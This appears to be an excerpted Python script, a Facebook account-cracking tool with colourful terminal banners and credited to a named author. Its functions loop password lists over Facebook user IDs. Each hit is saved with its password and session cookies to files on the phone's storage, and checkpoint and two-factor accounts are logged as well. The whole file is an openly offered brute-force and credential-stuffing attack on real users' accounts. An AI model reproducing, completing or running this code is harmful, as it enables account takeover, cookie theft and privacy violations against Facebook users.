...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mAtif-/SCHIAPARELLI\33[1;91m⊁ ')
os.system('espeak -a 300 " ,FILE CLONING 1..2; TOOLS,INSTALL Complete ,"')
time.sleep(1)
os.system('clear')
##
import os, platform, time, sys
...
os.system('espeak -a 500 " Checking For Update,"')
time.sleep(2)
...
def arfan1():
        ...
        return ua
#-----------------------------------------------------#
os.system("xdg-open https://www.facebook.com/TARGET.FB.HACKER?mibextid=ZbWKwL")
...
\33[1;92m─────────────────────────────────────────────
\33[1;92m  Tool    \33[1;91m ◉     \x1b[38;5;48m Free SCHIAPARELLI 	  
\33[1;92m FACEBOOK \33[1;91m     ◉     \x1b[38;5;208m ATiF KHaNx SCHIAPARELLI	 	
\33[1;92m GITHUB     \33[1;91m   ◉    \x1b[38;5;47m Atifkhan804	\33[1;91m[\33[1;95mAtif\33[1;91m]
\33[1;92m─────────────────────────────────────────────
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m FILE NAME : /sdcard/RJR.txt  etc..')
				linex()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRJR}[{G}ATiF-M2{bRJR}]-[{G}%s{bRJR}]-[{G}OK:%s{bRJR}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bRJR}[{G}ATiF-OK{ATiF}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/ATiF-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[ATiF-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[ATiF-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ATiF-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ATiF-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bRJR}[{G}ATiF-M1{bRJR}]-[{G}%s{bRJR}]-[{G}OK:%s{bRJR}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRJR-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {ATiF}[{G}LIVE-OK{bRJR}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bRJR}[{G}•{bRJR}]{G} '+kuki+'')
                linex()
                open('/sdcard/ATiF-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mATiF-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {ATiF}[{G}LIVE-OK{bRJR}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {ATiF}[{G}•{ATiF}]{G} '+kuki+'')
                linex()
                open('/sdcard/ATiF-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {ATiF}[{G}LIVE-OK{ATiF}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {ATiF}[{G}•{ATiF}]{G} '+kuki+'')
                linex()
                open('/sdcard/ATiF-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
